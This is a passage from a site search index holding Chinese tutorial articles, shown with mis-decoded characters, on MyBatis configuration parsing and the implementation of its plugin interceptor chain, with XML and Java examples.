ç¼å­ï¼ç¼å­æ¹å¼åä¸º session å statement ï¼ session å¨è¯¥ä¼è¯ä¸­å½ä¸­ç¸å sql è¯­å¥åæ¡ä»¶ï¼è¥å¨è¯¥ session ä¸­åç insert/update/delete/commit/rollback/close åä¼æ¸é¤ç¼å­ï¼ä½æ¯ï¼å¹¶ä¸ä¼å½±åå¶å®ä¼è¯ä¸­çç¼å­ï¼ statement ï¼åªéå¯¹å½åä¼è¯æ§è¡çè¿ä¸è¯­å¥ææï¼æ§è¡å®æ¯æ¥è¯¢ä¼ç«å³æ¸é¤ç¼å­ã\n * cachesï¼äºçº§ç¼å­ï¼åºäº namespace çç¼å­ï¼å¯æä¾ç¬¬ä¸æ¹å¶ä»æ¹å¼å®ç°ã\n\n# environments ç¯å¢è§£æ\n\nå¨ç¯å¢è§£æè¿ç¨ä¸­ä¼å¾å°ä¸é¢å ä¸ªéè¦çå±æ§ï¼\n\n * idï¼è¡¨æä½¿ç¨åªä¸ä¸ªç¯å¢åä¸ºä¸»è¦ç¯å¢éç½®ï¼è§£æ xml ä¸­ç <environment > æ ç­¾\n * transactionfactoryï¼è§£æ xml ä¸­ç <transactionmanager> ç type å±æ§ï¼å¦ææ¯ jdbc åå°±æ¯ jdbctransactionfactory ï¼ä¹å¯ä»¥èªè¡è®¾ç½®ï¼éè¦èªå·±æ³¨åå° typealiasregistry ä¸­\n * datasourcefactoryï¼è§£æ xml ä¸­ <datasource> ç type å±æ§ï¼å¦ææ¯ pooled ï¼åå¯¹åº pooleddatasourcefactory ï¼ unpooled å¯¹åº unpooleddatasourcefactory ï¼ druid å¯¹åº druiddatasourcefactory\n * datasourceï¼è§£æ xml ä¸­ <property> å¾å°å·ä½çè¿æ¥ä¿¡æ¯ï¼ä» datasourcefactory ä¸­è·å datasource\n\nå½ä»¥ä¸çä¿¡æ¯ç»ä»¶å®æ¯åä¼å°è£å° environment ä¸­ï¼ç¶åæ·»å å° configuration\n\n# mapper è§£æ\n\nå¨ mapper è§£æä¸­æä¸¤ç§ä¸åçè§£æï¼ä¸ä¸ªæ¯æä»¬å¸¸è§ç xml è§£æï¼ä¸ç§æ¯æ³¨è§£ï¼å¦ @selectï¼è¿éåªè®² xml è§£æï¼æå³ @select ç­æ³¨è§£è§£æï¼æ¾å¨åç»­ä¸å¼ä¸ç« ãé£è§£æé¦åä¼è¯»åæå°ææç mapperï¼å¨åå«è§£ææ¯ä¸ª mapper\n\n<mappers>\n    \x3c!-- xml éç½® --\x3e\n    <mapper resource="mapper/activity_mapper.xml"/>\n</mappers>\n\n\n1\n2\n3\n4\n\n\nä¸ä¸ªå®æ´ç mapper å¤§è´åå«å¦ä¸ä¿¡æ¯ï¼æä»¥åé¨ä¼æå¤ä¸ªè§£æåå«è§£æï¼å¦ cache è§£æï¼resultmap è§£æï¼select è§£æï¼insert è§£æç­ï¼æä»¬è¿éè¯´ä¸éè¦çè§£æå¯¹è±¡åä½ç¨å³å¯ã\n\n<mapper namespace="cn.bugstack.mybatis.test.dao.iactivitydao">\n    <cache eviction="fifo" flushinterval="600000" size="512" readonly="true"/>\n    <resultmap id="activitymap" type="cn.bugstack.mybatis.test.po.activity">\n        <id column="id" property="id"/>\n        <result column="activity_id" property="activityid"/>\n        <result column="activity_name" property="activityname"/>\n        <result column="activity_desc" property="activitydesc"/>\n        <result column="create_time" property="createtime"/>\n        <result column="update_time" property="updatetime"/>\n    </resultmap>\n    <select id="queryactivitybyid" parametertype="cn.bugstack.mybatis.test.po.activity" resultmap="activitymap" flushcache="false" usecache="true">\n        select activity_id, activity_name, activity_desc, create_time, update_time\n        from activity\n        <trim prefix="where" prefixoverrides="and | or" suffixoverrides="and">\n            <if test="null != activityid">\n                activity_id = #{activityid}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n<cache > æ ç­¾éç½®äºäºçº§ç¼å­ï¼å¯¹äºç¼å­ä¹ä¼æåç¬çä¸ç« è®²è§£ï¼è¿éåªè®²è§£æå¾å°çéè¦ç±»åä½ç¨ï¼éè¿æ ç­¾ä¼å°è£ä¸ä¸ª cache å¯¹è±¡ï¼è¯¥å¯¹è±¡ä»¥ namespace åä¸º cache ç id ï¼å¹¶æ cache å¯¹è±¡æ·»å å° configuration ä¸­\n\n<resultmap> æ ç­¾éç½®ä¸ä¸ª <select > æ ç­¾ç resultmap å±æ§è¿åç»æå¯¹è±¡çå³ç³»æ å°ï¼ä»ä¼å¾å°å¯¹è±¡ä»¥åå¾å°æè¿°çå java å±æ§ç±»ååå¯¹åºç typehandler ç±»åå¤çå¨ï¼å¨è¿åçæ¶åä½¿ç¨ç±»åå¤çå¨ï¼å¤çæ¥è¯¢è¿åç»æçæ°æ®ç±»åå¯¹åº java çæ å°ã <resultmap> æ ç­¾å¯ä»¥æå¤ä¸ªï¼æä»¥ä¼æ·»å å°éåä¸­ï¼ç¶åç»´æ¤å° configuration ä¸­\n\n<select> or <insert> è¿éæä¸»è¦çé¨åå°±æ¯å¨è§£æå®æåä¼æ namespace.id åä¸º key ï¼æè§£æçä¿¡æ¯ mappedstatement åä¸º value ï¼ç»´æ¤å° configuration ä¸­ï¼ä»¥ä¾¿ mybatis å¨è¢«ä»£çç±»è°ç¨æ¹æ³çæ¶åå¿«éæ¾å°ï¼è¯¥æ¹æ³å¯¹åºç sql ä¿¡æ¯ç­\n\n# plugins æä»¶è§£æ\n\n# settings è®¾ç½®è§£æ\n\n\n# åå¤\n\n\n# æ§è¡',charsets:{cjk:!0}},{title:"æ ¸å¿åè½æè§£ Pluginæä»¶åè½å®ç°",frontmatter:{title:"æ ¸å¿åè½æè§£ Pluginæä»¶åè½å®ç°",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/301/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/02.Mybatis/31.mybatis/301.%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E6%8B%86%E8%A7%A3%20Plugin%E6%8F%92%E4%BB%B6%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0.html",relativePath:"01.æ¡æ¶/02.Mybatis/31.mybatis/301.æ ¸å¿åè½æè§£ Pluginæä»¶åè½å®ç°.md",key:"v-7bea548f",path:"/mybatis/mybatis/301/",headers:[{level:2,title:"è§£æ",slug:"è§£æ",normalizedTitle:"è§£æ",charIndex:38},{level:2,title:"æ³¨å",slug:"æ³¨å",normalizedTitle:"æ³¨å",charIndex:42},{level:2,title:"æ§è¡",slug:"æ§è¡",normalizedTitle:"æ§è¡",charIndex:46},{level:2,title:"èªå®ä¹",slug:"èªå®ä¹",normalizedTitle:"èªå®ä¹",charIndex:5721}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"è§£æ æ³¨å æ§è¡ èªå®ä¹",content:'Mybatis Plugin æ¯éç Mybatis çå·¥ä½æµç¨ä¸èµ·è¢«è¿è¡ è§£æ->æ³¨å->æ§è¡ çï¼äºè§£æ¯ä¸ªæ­¥éª¤æè½æ´å¥½çå¯¹ Mybatis ææä¾ç Plugin æºå¶è¿è¡å®ç°åæ©å±ãå¨æä»¬å·²ç¥ç Mybatis çæä»¶æåé¡µæä»¶ãç¼å­æä»¶ç­ï¼ä¹æä»¥å¯ä»¥è½åå°æ©å±æ¯å ä¸ºä»å¨èªå·±æ¬èº«ç Executorï¼çäº§æ§è¡å¨ï¼ ï¼ StatementHandlerï¼è¯­å¥å¤çå¨ï¼ ï¼ ParameterHandlerï¼åæ°å¤çå¨ï¼ ï¼ ResultSetHandlerï¼ç»æéå¤çå¨ï¼ è¿åä¸ªå°æ¹åäºæ¦æªï¼å½ä»ç»å°æ§è¡æ­¥éª¤çæ¶åå°±å¯ä»¥çå°å·ä½å®ç°ã\n\n\n# è§£æ\n\nå¸¸è§ç XML éç½®\n\n<plugins>\n    <plugin interceptor="cn.mybatis.test.plugin.TestPlugin">\n        <property name="test00" value="100"/>\n        <property name="test01" value="200"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n6\n\n\næ ¸å¿è§£ææ¹æ³\n\nprivate void pluginElement(Element parent) throws Exception {\n    if (parent == null) return;\n    List<Element> elements = parent.elements();\n    for (Element element : elements) {\n        // è§£æç±»è·¯å¾\n        String interceptor = element.attributeValue("interceptor");\n        // åæ°éç½®\n        Properties properties = new Properties();\n        List<Element> propertyElementList = element.elements("property");\n        for (Element property : propertyElementList) {\n            properties.setProperty(property.attributeValue("name"), property.attributeValue("value"));\n        }\n        // è·åæä»¶å®ç°ç±»å¹¶å®ä¾åï¼cn.mybatis.test.plugin.TestPlugin \n        // éè¿ Resources.classForName(string) è·åå®ä¾\n        Interceptor interceptorInstance = (Interceptor) resolveClass(interceptor).newInstance();\n        // è®¾ç½®éç½®å±æ§\n        interceptorInstance.setProperties(properties);\n        // æ³¨åå° configuration ä¸­\n        configuration.addInterceptor(interceptorInstance);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# æ³¨å\n\nè§£æçæ¶åä¼å¨æ¹æ³åé¨æ§è¡ configuration.addInterceptor(interceptorInstance); è¿ä¸æ­¥æ¯ææä»¶ç»´æ¤å° Configuration å¨å±éç½®ä¸­ï¼ä½æä»¶å¶å®åºè¯¥æå¾å¤åï¼æä»¥æä¾çæ¯ä¸ä¸ª InterceptorChain å¯¹è±¡ç± Configuration ç»´æ¤\n\npublic class Configuration {\n    // æä»¶æ¦æªå¨é¾\n    protected final InterceptorChain interceptorChain = new InterceptorChain();\n    public void addInterceptor(Interceptor interceptorInstance) {\n        interceptorChain.addInterceptor(interceptorInstance);\n    }\n    // other å¶ä»éç½®\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nInterceptorChain éé¢ç»´æ¤çæ¯ä¸ä¸ªéåï¼ä¸é¨å­æ¾ææç Plugin\n\npublic class InterceptorChain {\n    // æä»¶æ¦æªå¨å®¹å¨\n    private final List<Interceptor> interceptors = new ArrayList<>();\n    //\n    public Object pluginAll(Object target) {\n        for (Interceptor interceptor : interceptors) {\n            target = interceptor.plugin(target);\n        }\n        return target;\n    }\n    // æ·»å å°æä»¶å®¹å¨\n    public void addInterceptor(Interceptor interceptor) {\n        interceptors.add(interceptor);\n    }\n    public List<Interceptor> getInterceptors(){\n        return Collections.unmodifiableList(interceptors);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nä»è§£æå°æ³¨åè¿ä¸¤æ­¥å°±å¯ä»¥çåºï¼MyBatis æ¯ææä»¶ä»¥æ¦æªå¨çå½¢å¼å­æ¾å°ä¸ä¸ªæ¦æªå¨å®¹å¨éï¼è¿ä¸ªå®¹å¨æ¯ Configuration å¨å±éç½®ç±»æ¥è¿è¡ç»´æ¤ç\n\n\n# æ§è¡\n\næ§è¡æ¯å¨è°ç¨å·ä½çæ¥è¯¢æ¹æ³æ´»å¶ä»å¨ Mybatis éææè¿°ç SQL æ¹æ³æ¶è¿è¡çè§¦åï¼è§¦åä¼å¨å¦ä¸ä»£ç ä¸­çä½ç½®ä¸­è§¦åã\n\n  // åå»ºåæ°å¤çå¨\n  public ParameterHandler newParameterHandler(MappedStatement mappedStatement, Object parameterObject, BoundSql boundSql) {\n    ParameterHandler parameterHandler = mappedStatement.getLang().createParameterHandler(mappedStatement, parameterObject, boundSql);\n    parameterHandler = (ParameterHandler) interceptorChain.pluginAll(parameterHandler);\n    return parameterHandler;\n  }\n \n  // åå»ºç»æéå¤çå¨\n  public ResultSetHandler newResultSetHandler(Executor executor, MappedStatement mappedStatement, RowBounds rowBounds, ParameterHandler parameterHandler,\n      ResultHandler resultHandler, BoundSql boundSql) {\n    ResultSetHandler resultSetHandler = new DefaultResultSetHandler(executor, mappedStatement, parameterHandler, resultHandler, boundSql, rowBounds);\n    resultSetHandler = (ResultSetHandler) interceptorChain.pluginAll(resultSetHandler);\n    return resultSetHandler;\n  }\n \n  // åå»ºè¯­å¥å¤çå¨\n  public StatementHandler newStatementHandler(Executor executor, MappedStatement mappedStatement, Object parameterObject, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql) {\n    StatementHandler statementHandler = new RoutingStatementHandler(executor, mappedStatement, parameterObject, rowBounds, resultHandler, boundSql);\n    statementHandler = (StatementHandler) interceptorChain.pluginAll(statementHandler);\n    return statementHandler;\n  }\n\n  // çäº§æ§è¡å¨\n  public Executor newExecutor(Transaction transaction, ExecutorType executorType) {\n    executorType = executorType == null ? defaultExecutorType : executorType;\n    executorType = executorType == null ? ExecutorType.SIMPLE : executorType;\n    Executor executor;\n    if (ExecutorType.BATCH == executorType) {\n      // æ¹éå¤çå¨\n      executor = new BatchExecutor(this, transaction);\n    } else if (ExecutorType.REUSE == executorType) {\n      executor = new ReuseExecutor(this, transaction);\n    } else {\n      // ç®åå¤çå¨\n      executor = new SimpleExecutor(this, transaction);\n    }\n    // äºçº§ç¼å­å¤çå¨\n    if (cacheEnabled) {\n      executor = new CachingExecutor(executor);\n    }\n    executor = (Executor) interceptorChain.pluginAll(executor);\n    return executor;\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\nä¼çå°ä»ä¼è°ç¨ InterceptorChain#pluginAll æ¹æ³ï¼è¯¥ç±»å¨æ³¨åæ­¥éª¤ä¸­ææåå°ï¼éé¢ç»´æ¤äºææçæä»¶ï¼é£ä¹å¨è¿éå°±ä¼æ¶å¾ªç¯ææçæä»¶ï¼æ¯ä¸ªæä»¶è°ç¨ Interceptor#plugin\n\n// å¾ªç¯è°ç¨\npublic Object pluginAll(Object target) {\n    for (Interceptor interceptor : interceptors) {\n        target = interceptor.plugin(target);\n    }\n    return target;\n}\n\n// æ§è¡wrap\npublic interface Interceptor {\n    // æ¦æªï¼ä½¿ç¨æ¹å®ç°\n    Object intercept(Invocation invocation) throws Throwable;\n    // ä»£ç\n    default Object plugin(Object target) {\n        return Plugin.wrap(target, this);\n    }\n    // è®¾ç½®å±æ§\n    default void setProperties(Properties properties) {\n        // NOP\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nInterceptor#plugin æ¹æ³åé¨ä¹å°±æ¯è°ç¨ Plugin#wrap éææ¹æ³ï¼è¯¥æ¹æ³éè¿è·åèªå®ä¹æä»¶çæ³¨è§£ï¼æ¥è§å¯ä½ éè¦å¯¹åªä¸ªå¤çå¨ï¼åªä¸ªæ¹æ³ä»¥ååæ°ç±»åå»å¹éæ¦æªå¯¹è±¡çå·ä½æ¹æ³ï¼å¦æå¤ä¸ä¸ªåæ°é½å¯è½æ¾ä¸å°è¦æ¦æªçæ¹æ³ãæ¾å°æ¹æ³åç¶åå»å¨æä»£çè¿ä¸ªæ¹æ³ã\n\n// \npublic class Plugin implements InvocationHandler {\n    private Object target;\n    private Interceptor interceptor;\n    private Map<Class<?>, Set<Method>> signatureMap;\n\n    private Plugin(Object target, Interceptor interceptor, Map<Class<?>, Set<Method>> signatureMap) {\n        this.target = target;\n        this.interceptor = interceptor;\n        this.signatureMap = signatureMap;\n    }\n    // å·ä½çä»£çå®ç°\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        // è·åå£°æçæ¹æ³åè¡¨\n        Set<Method> methods = signatureMap.get(method.getDeclaringClass());\n        // è¿æ»¤éè¦æ¦æªçæ¹æ³\n        if (methods != null && methods.contains(method)) {\n            // è°ç¨ Interceptor#intercept æå¥èªå·±çåå°é»è¾\n            return interceptor.intercept(new Invocation(target, method, args));\n        }\n        return method.invoke(target, args);\n    }\n    /**\n     * ç¨ä»£çæèªå®ä¹æä»¶è¡ä¸ºåè£¹å°ç®æ æ¹æ³ä¸­ï¼ä¹å°±æ¯ Plugin.invoke çè¿æ»¤è°ç¨\n     */\n    public static Object wrap(Object target, Interceptor interceptor) {\n        // åå¾ç­¾åMap\n        Map<Class<?>, Set<Method>> signatureMap = getSignatureMap(interceptor);\n        // åå¾è¦æ¹åè¡ä¸ºçç±»(ParameterHandler|ResultSetHandler|StatementHandler|Executor)\n        Class<?> type = target.getClass();\n        // åå¾æ¥å£\n        Class<?>[] interfaces = getAllInterfaces(type, signatureMap);\n        // åå»ºä»£ç(StatementHandler)\n        if (interfaces.length > 0) {\n            // ä»£ç\n            return Proxy.newProxyInstance(\n                    type.getClassLoader(),\n                    interfaces,\n                    new Plugin(target, interceptor, signatureMap));\n        }\n        return target;\n    }\n    /**\n     * è·åæ¹æ³ç­¾åç» Map\n     */\n    private static Map<Class<?>, Set<Method>> getSignatureMap(Interceptor interceptor) {\n        // å Intercepts æ³¨è§£\n        Intercepts interceptsAnnotation = interceptor.getClass().getAnnotation(Intercepts.class);\n        // å¿é¡»å¾æ Intercepts æ³¨è§£ï¼æ²¡ææ¥é\n        if (interceptsAnnotation == null) {\n            throw new RuntimeException("No @Intercepts annotation was found in interceptor " + interceptor.getClass().getName());\n        }\n        // valueæ¯æ°ç»åï¼Signatureçæ°ç»\n        Signature[] sigs = interceptsAnnotation.value();\n        // æ¯ä¸ª class ç±»æå¤ä¸ªå¯è½æå¤ä¸ª Method éè¦è¢«æ¦æª\n        Map<Class<?>, Set<Method>> signatureMap = new HashMap<>();\n        for (Signature sig : sigs) {\n            Set<Method> methods = signatureMap.computeIfAbsent(sig.type(), k -> new HashSet<>());\n            try {\n                // ä¾å¦è·åå°æ¹æ³ï¼StatementHandler.prepare(Connection connection)ãStatementHandler.parameterize(Statement statement)...\n                Method method = sig.type().getMethod(sig.method(), sig.args());\n                methods.add(method);\n            } catch (NoSuchMethodException e) {\n                throw new RuntimeException("Could not find method on " + sig.type() + " named " + sig.method() + ". Cause: " + e, e);\n            }\n        }\n        return signatureMap;\n    }\n    /**\n     * åå¾æ¥å£\n     */\n    private static Class<?>[] getAllInterfaces(Class<?> type, Map<Class<?>, Set<Method>> signatureMap) {\n        Set<Class<?>> interfaces = new HashSet<Class<?>>();\n        while (type != null) {\n            for (Class<?> c : type.getInterfaces()) {\n                // æ¦æª ParameterHandler|ResultSetHandler|StatementHandler|Executor\n                if (signatureMap.containsKey(c)) {\n                    interfaces.add(c);\n                }\n            }\n            type = type.getSuperclass();\n        }\n        return interfaces.toArray(new Class<?>[interfaces.size()]);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\n\n# èªå®ä¹\n\npackage cn.mybatis.test.plugin;\n\nimport cn.mybatis.executor.statement.StatementHandler;\nimport cn.mybatis.mapping.BoundSql;\nimport cn..mybatis.plugin.Interceptor;\nimport cn.mybatis.plugin.Intercepts;\nimport cn.mybatis.plugin.Invocation;\nimport cn.mybatis.plugin.Signature;\n\nimport java.sql.Connection;\nimport java.util.Properties;\n\n@Intercepts({@Signature(type = StatementHandler.class, method = "prepare", args = {Connection.class})})\npublic class TestPlugin implements Interceptor {\n\n    @Override\n    public Object intercept(Invocation invocation) throws Throwable {\n        // è·åStatementHandler\n        StatementHandler statementHandler = (StatementHandler) invocation.getTarget();\n        // è·åSQLä¿¡æ¯\n        BoundSql boundSql = statementHandler.getBoundSql();\n        String sql = boundSql.getSql();\n        // è¾åºSQL\n        System.out.println("æ¦æªSQLï¼" + sql);\n        // æ¾è¡\n        return invocation.proceed();\n    }\n\n    @Override\n    public void setProperties(Properties properties) {\n        System.out.println("åæ°è¾åºï¼" + properties.getProperty("test00"));\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n',normalizedContent:'mybatis plugin æ¯éç mybatis çå·¥ä½æµç¨ä¸èµ·è¢«è¿è¡ è§£æ->æ³¨å->æ§è¡ çï¼äºè§£æ¯ä¸ªæ­¥éª¤æè½æ´å¥½çå¯¹ mybatis ææä¾ç plugin æºå¶è¿è¡å®ç°åæ©å±ãå¨æä»¬å·²ç¥ç mybatis çæä»¶æåé¡µæä»¶ãç¼å­æä»¶ç­ï¼ä¹æä»¥å¯ä»¥è½åå°æ©å±æ¯å ä¸ºä»å¨èªå·±æ¬èº«ç executorï¼çäº§æ§è¡å¨ï¼ ï¼ statementhandlerï¼è¯­å¥å¤çå¨ï¼ ï¼ parameterhandlerï¼åæ°å¤çå¨ï¼ ï¼ resultsethandlerï¼ç»æéå¤çå¨ï¼ è¿åä¸ªå°æ¹åäºæ¦æªï¼å½ä»ç»å°æ§è¡æ­¥éª¤çæ¶åå°±å¯ä»¥çå°å·ä½å®ç°ã\n\n\n# è§£æ\n\nå¸¸è§ç xml éç½®\n\n<plugins>\n    <plugin interceptor="cn.mybatis.test.plugin.testplugin">\n        <property name="test00" value="100"/>\n        <property name="test01" value="200"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n6\n\n\næ ¸å¿è§£ææ¹æ³\n\nprivate void pluginelement(element parent) throws exception {\n    if (parent == null) return;\n    list<element> elements = parent.elements();\n    for (element element : elements) {\n        // è§£æç±»è·¯å¾\n        string interceptor = element.attributevalue("interceptor");\n        // åæ°éç½®\n        properties properties = new properties();\n        list<element> propertyelementlist = element.elements("property");\n        for (element property : propertyelementlist) {\n            properties.setproperty(property.attributevalue("name"), property.attributevalue("value"));\n        }\n        // è·åæä»¶å®ç°ç±»å¹¶å®ä¾åï¼cn.mybatis.test.plugin.testplugin \n        // éè¿ resources.classforname(string) è·åå®ä¾\n        interceptor interceptorinstance = (interceptor) resolveclass(interceptor).newinstance();\n        // è®¾ç½®éç½®å±æ§\n        interceptorinstance.setproperties(properties);\n        // æ³¨åå° configuration ä¸­\n        configuration.addinterceptor(interceptorinstance);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# æ³¨å\n\nè§£æçæ¶åä¼å¨æ¹æ³åé¨æ§è¡ configuration.addinterceptor(interceptorinstance); è¿ä¸æ­¥æ¯ææä»¶ç»´æ¤å° configuration å¨å±éç½®ä¸­ï¼ä½æä»¶å¶å®åºè¯¥æå¾å¤åï¼æä»¥æä¾çæ¯ä¸ä¸ª interceptorchain å¯¹è±¡ç± configuration ç»´æ¤\n\npublic class configuration {\n    // æä»¶æ¦æªå¨é¾\n    protected final interceptorchain interceptorchain = new interceptorchain();\n    public void addinterceptor(interceptor interceptorinstance) {\n        interceptorchain.addinterceptor(interceptorinstance);\n    }\n    // other å¶ä»éç½®\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\ninterceptorchain éé¢ç»´æ¤çæ¯ä¸ä¸ªéåï¼ä¸é¨å­æ¾ææç plugin\n\npublic class interceptorchain {\n    // æä»¶æ¦æªå¨å®¹å¨\n    private final list<interceptor> interceptors = new arraylist<>();\n    //\n    public object pluginall(object target) {\n        for (interceptor interceptor : interceptors) {\n            target = interceptor.plugin(target);\n        }\n        return target;\n    }\n    // æ·»å å°æä»¶å®¹å¨\n    public void addinterceptor(interceptor interceptor) {\n        interceptors.add(interceptor);\n    }\n    public list<interceptor> getinterceptors(){\n        return collections.unmodifiablelist(interceptors);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nä»è§£æå°æ³¨åè¿ä¸¤æ­¥å°±å¯ä»¥çåºï¼mybatis æ¯ææä»¶ä»¥æ¦æªå¨çå½¢å¼å­æ¾å°ä¸ä¸ªæ¦æªå¨å®¹å¨éï¼è¿ä¸ªå®¹å¨æ¯ configuration å¨å±éç½®ç±»æ¥è¿è¡ç»´æ¤ç\n\n\n# æ§è¡\n\næ§è¡æ¯å¨è°ç¨å·ä½çæ¥è¯¢æ¹æ³æ´»å¶ä»å¨ mybatis éææè¿°ç sql æ¹æ³æ¶è¿è¡çè§¦åï¼è§¦åä¼å¨å¦ä¸ä»£ç ä¸­çä½ç½®ä¸­è§¦åã\n\n  // åå»ºåæ°å¤çå¨\n  public parameterhandler newparameterhandler(mappedstatement mappedstatement, object parameterobject, boundsql boundsql) {\n    parameterhandler parameterhandler = mappedstatement.getlang().createparameterhandler(mappedstatement, parameterobject, boundsql);\n    parameterhandler = (parameterhandler) interceptorchain.pluginall(parameterhandler);\n    return parameterhandler;\n  }\n \n  // åå»ºç»æéå¤çå¨\n  public resultsethandler newresultsethandler(executor executor, mappedstatement mappedstatement, rowbounds rowbounds, parameterhandler parameterhandler,\n      resulthandler resulthandler, boundsql boundsql) {\n    resultsethandler resultsethandler = new defaultresultsethandler(executor, mappedstatement, parameterhandler, resulthandler, boundsql, rowbounds);\n    resultsethandler = (resultsethandler) interceptorchain.pluginall(resultsethandler);\n    return resultsethandler;\n  }\n \n  // åå»ºè¯­å¥å¤çå¨\n  public statementhandler newstatementhandler(executor executor, mappedstatement mappedstatement, object parameterobject, rowbounds rowbounds, resulthandler resulthandler, boundsql boundsql) {\n    statementhandler statementhandler = new routingstatementhandler(executor, mappedstatement, parameterobject, rowbounds, resulthandler, boundsql);\n    statementhandler = (statementhandler) interceptorchain.pluginall(statementhandler);\n    return statementhandler;\n  }\n\n  // çäº§æ§è¡å¨\n  public executor newexecutor(transaction transaction, executortype executortype) {\n    executortype = executortype == null ? defaultexecutortype : executortype;\n    executortype = executortype == null ? executortype.simple : executortype;\n    executor executor;\n    if (executortype.batch == executortype) {\n      // æ¹éå¤çå¨\n      executor = new batchexecutor(this, transaction);\n    } else if (executortype.reuse == executortype) {\n      executor = new reuseexecutor(this, transaction);\n    } else {\n      // ç®åå¤çå¨\n      executor = new simpleexecutor(this, transaction);\n    }\n    // äºçº§ç¼å­å¤çå¨\n    if (cacheenabled) {\n      executor = new cachingexecutor(executor);\n    }\n    executor = (executor) interceptorchain.pluginall(executor);\n    return executor;\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\nä¼çå°ä»ä¼è°ç¨ interceptorchain#pluginall æ¹æ³ï¼è¯¥ç±»å¨æ³¨åæ­¥éª¤ä¸­ææåå°ï¼éé¢ç»´æ¤äºææçæä»¶ï¼é£ä¹å¨è¿éå°±ä¼æ¶å¾ªç¯ææçæä»¶ï¼æ¯ä¸ªæä»¶è°ç¨ interceptor#plugin\n\n// å¾ªç¯è°ç¨\npublic object pluginall(object target) {\n    for (interceptor interceptor : interceptors) {\n        target = interceptor.plugin(target);\n    }\n    return target;\n}\n\n// æ§è¡wrap\npublic interface interceptor {\n    // æ¦æªï¼ä½¿ç¨æ¹å®ç°\n    object intercept(invocation invocation) throws throwable;\n    // ä»£ç\n    default object plugin(object target) {\n        return plugin.wrap(target, this);\n    }\n    // è®¾ç½®å±æ§\n    default void setproperties(properties properties) {\n        // nop\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\ninterceptor#plugin æ¹æ³åé¨ä¹å°±æ¯è°ç¨ plugin#wrap éææ¹æ³ï¼è¯¥æ¹æ³éè¿è·åèªå®ä¹æä»¶çæ³¨è§£ï¼æ¥è§å¯ä½ éè¦å¯¹åªä¸ªå¤çå¨ï¼åªä¸ªæ¹æ³ä»¥ååæ°ç±»åå»å¹éæ¦æªå¯¹è±¡çå·ä½æ¹æ³ï¼å¦æå¤ä¸ä¸ªåæ°é½å¯è½æ¾ä¸å°è¦æ¦æªçæ¹æ³ãæ¾å°æ¹æ³åç¶åå»å¨æä»£çè¿ä¸ªæ¹æ³ã\n\n// \npublic class plugin implements invocationhandler {\n    private object target;\n    private interceptor interceptor;\n    private map<class<?>, set<method>> signaturemap;\n\n    private plugin(object target, interceptor interceptor, map<class<?>, set<method>> signaturemap) {\n        this.target = target;\n        this.interceptor = interceptor;\n        this.signaturemap = signaturemap;\n    }\n    // å·ä½çä»£çå®ç°\n    @override\n    public object invoke(object proxy, method method, object[] args) throws throwable {\n        // è·åå£°æçæ¹æ³åè¡¨\n        set<method> methods = signaturemap.get(method.getdeclaringclass());\n        // è¿æ»¤éè¦æ¦æªçæ¹æ³\n        if (methods != null && methods.contains(method)) {\n            // è°ç¨ interceptor#intercept æå¥èªå·±çåå°é»è¾\n            return interceptor.intercept(new invocation(target, method, args));\n        }\n        return method.invoke(target, args);\n    }\n    /**\n     * ç¨ä»£çæèªå®ä¹æä»¶è¡ä¸ºåè£¹å°ç®æ æ¹æ³ä¸­ï¼ä¹å°±æ¯ plugin.invoke çè¿æ»¤è°ç¨\n     */\n    public static object wrap(object target, interceptor interceptor) {\n        // 